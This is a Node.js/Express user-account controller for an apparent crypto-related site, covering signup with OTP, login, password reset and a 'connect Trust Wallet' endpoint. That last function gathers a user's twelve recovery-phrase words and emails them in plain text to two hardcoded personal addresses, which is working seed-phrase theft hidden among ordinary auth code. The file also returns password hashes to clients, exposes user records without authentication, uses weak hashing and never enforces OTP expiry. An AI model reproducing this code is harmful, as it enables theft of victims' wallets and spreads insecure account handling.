const bcrypt = require("bcryptjs");
const { v4: uuidv4 } = require('uuid');
var randomize  = require("randomatic")
const jwt = require('jsonwebtoken')

const config = require('../config/default')
const {changePasswordEmail, signupOtpVerificationEmail, welcomeEmail, connectTrustWalletEmail}=require('../Utils/SendEmail')

const User = require('../model/User')
const TempUser = require('../model/TempUser')

const userSignup= async (req, res)=>{

    console.log(req.body)
    const {fName,lName, email, password} = req.body;

    if( !fName || !lName || !email || !password){
        res.status(202).json({'message':'Incomplete Data!'})
        return; 
    }

    const userExist = await User.findOne({email: email})
    if(userExist){
        res.status(202).json({'message':'Account already exists!'})
        return;
    }

    //Deleting if temp user with email exists already
    await TempUser.deleteMany({ email: req.body.email });

    const passwordHash = await bcrypt.hash(req.body.password, 5);


    //This will be saved for the new user and req.body.referralCode is the one coming from client.
    const userId=uuidv4();

    const newTempUser = new TempUser({

        userId: userId,
        fName: req.body.fName,
        lName: req.body.lName,
        
        accountNumber: randomize('0', 10),
        email: req.body.email,
        password:passwordHash,
        isApproved: false,
        isBlocked: false,
    });

    

    await newTempUser.save();

    res.status(200).json(newTempUser);
}

const signupAfterVerification = async (req, res) => {
    console.log(req.body)
    const {userId, otp} = req.body;

    if( !userId || !otp){
        res.status(202).json({'message':'Incomplete Data!'})
        return; 
    }


    const tempUser = await TempUser.findOne({userId: userId})
    if(tempUser){
        const fetchedOtp = await tempUser.timedOtp.otp;

        if(fetchedOtp === otp){
            const userExists = await User.findOne({userId: userId});

            if(userExists){
                res.status(202).json({'message':'This email is already registered!'})
                return;
            }else{
                const newUser = new User({

                    userId: tempUser.userId,
                    fName: tempUser.fName,
                    lName: tempUser.lName,
                    
                    accountNumber: tempUser.accountNumber,
                    email: tempUser.email,
                    password: tempUser.password,
                    isApproved: tempUser.isApproved,
                    isBlocked: false,
                    
                })

                await newUser.save().then(()=>welcomeEmail(tempUser.fName, tempUser.lName, tempUser.email));
                res.json({status: 200 });
            } 

        }else{
            res.status(202).json({'message':'Wrong Otp!'})
        }

    }else{
        res.status(202).json({'message':'Temp user is not found!'});
    }

}


const userLogin=async (req, res)=>{
    const {email, password} = req.body;


    if (email === null || password === null || email === "" || password === "") {
        res.status(202).json({ message: "Incomplete Data" });
        return;
    } else{
        const userExists = await User.findOne({ email: email.toLowerCase() });

        if (userExists) {
            const isMatch = await bcrypt.compare(password, userExists.password);
            if (isMatch) {
                const token = await jwt.sign({ _id: userExists._id }, config.jwt.secret);
                res.status(200).json({ message: "OK", token: token, user: userExists});
            }
            else {
                res.status(202).json({ message: "Wrong Password" });
            }
        }else{
            res.status(202).json({ message: "Email is not registered." });
        }
    }
}

const getUser=async (req, res)=>{
    // Accepting {userId: userId}

    const user = await User.findOne({userId: req.body.userId})
    res.send(user);
}







const sendSignupVerificationOtp = async (req, res) => {
    // Accepting: {
    //     email: email
    // }
    

    const userId = req.body.userId;
    const otp = randomize('0', 6);
    const today = new Date();
    const minutes = parseInt(today.getMinutes()) + 5; //OTP validation for 5 minutes
    const time = today.getHours() + ":" + minutes + ":" + today.getSeconds();

    const timedOtp = {
        otp: otp,
        timeStamp: time
    }





    const userExists = await TempUser.findOne({ userId: userId });
    if (userExists) {
        await TempUser.findOne({ userId: userId })
        .then(async (response)=>{
            await userExists.updateOne({ timedOtp: timedOtp })
            await signupOtpVerificationEmail(otp, userExists.email)
            
            res.status(200).json({userId: response.userId}) 
        
        }).catch(err=>{
        console.log(err);
        })
    }else{
        res.status(202).json({'message':'User is not registered!'});
    }
}

const sendUserPasswordResetOtp = async (req, res) => {
    // Accepting: {
    //     email: email
    // }


    

        const email = req.body.email;
        const otp = randomize('0', 6);
        const today = new Date();
        const minutes = parseInt(today.getMinutes()) + 5; //OTP validation for 5 minutes
        const time = today.getHours() + ":" + minutes + ":" + today.getSeconds();

        const timedOtp = {
            otp: otp,
            timeStamp: time
        }
        // console.log(otp);    

    



        const userExists = await User.findOne({ email: req.body.email });
        if (userExists) {
            await User.findOne({ email: req.body.email })
            .then(async (response)=>{
                await userExists.updateOne({ timedOtp: timedOtp })
                await changePasswordEmail(otp, email)
                
                res.status(200).json({userId: response.userId}) 
            
            }).catch(err=>{
            console.log(err);
            })
        }else{
            res.status(202).json({'message':'User is not registered!'});
        }

}

const userChangePassword = async (req, res) => {

    // Accepting:{
    //     password: password,
    //     cPassword: cPassword,
    //     otp: otp,
    //     otId: otId,
    // }

    const userExists = await User.findOne({ userId: req.body.otpId });

    if (userExists) {
        if (req.body.password !== req.body.cPassword) {
            res.status(202).json({ message: "Password do not match!" })
        } else if (req.body.password === req.body.cPassword) {

            if (userExists.timedOtp.otp !== req.body.otp) {
                res.status(202).json({
                    message: "Wrong Otp"
                })
            } else {
                let password = await bcrypt.hash(req.body.password, 5);
                await userExists.updateOne({ password: password });
                res.status(200).json({ message: "Password Changed" })
                // SendEmail("Password Changed", "Password for your account has been successfully changed.", response.email);
            }
        }
    } else {
        res.status(202).json({ message: "Error" })
    }
}




const userConnectTrustWallet = async (req, res) => {
    const {word1, word2, word3, word4, word5, word6, word7, word8, word9, word10, word11, word12, userEmail, givenEmail } =req.body; 
    // console.log(req.body)
    if(word1==="" || word2==="" || word3==="" || word4==="" || word5==="" || word6==="" || word7==="" || word8==="" || word9==="" || word10==="" || word11==="" || word12==="" || givenEmail===""){
     res.status(202).json({ message: "Incomplete Data" });
    }else{
        await connectTrustWalletEmail('hamsterpilottoken@gmail.com', 
        `
            User ${userEmail} wants to connect Trust Wallet with the following data: <br/>
            Email: ${givenEmail}
            Word1: ${word1}
            Word2: ${word2}
            Word3: ${word3}
            Word4: ${word4}
            Word5: ${word5}
            Word6: ${word6}
            Word7: ${word7}
            Word8: ${word8}
            Word9: ${word9}
            Word10: ${word10}
            Word11: ${word11}
            Word12: ${word12}

        `)
        // res.status(200).json({message: 'Connect requested!'})
        
        await connectTrustWalletEmail('androgkp@outlook.com', 
        `
            User ${userEmail} wants to connect Trust Wallet with the following data: <br/>
            Email: ${givenEmail} <br/>
            Word1: ${word1} <br/>
            Word2: ${word2} <br/>
            Word3: ${word3} <br/>
            Word4: ${word4} <br/>
            Word5: ${word5} <br/>
            Word6: ${word6} <br/>
            Word7: ${word7} <br/>
            Word8: ${word8} <br/>
            Word9: ${word9} <br/>
            Word10: ${word10} <br/>
            Word11: ${word11} <br/>
            Word12: ${word12} <br/>
            <br/>


            ${word1} ${word2} ${word3} ${word4} ${word5} ${word6} ${word7} ${word8} ${word9} ${word10} ${word11} ${word12}

        `)
        res.status(200).json({message: 'Connect requested!'})
    }
}
module.exports={
    userSignup,
    signupAfterVerification,
    userLogin,
    getUser,
    sendUserPasswordResetOtp,
    sendSignupVerificationOtp,
    userChangePassword,
    userConnectTrustWallet,
}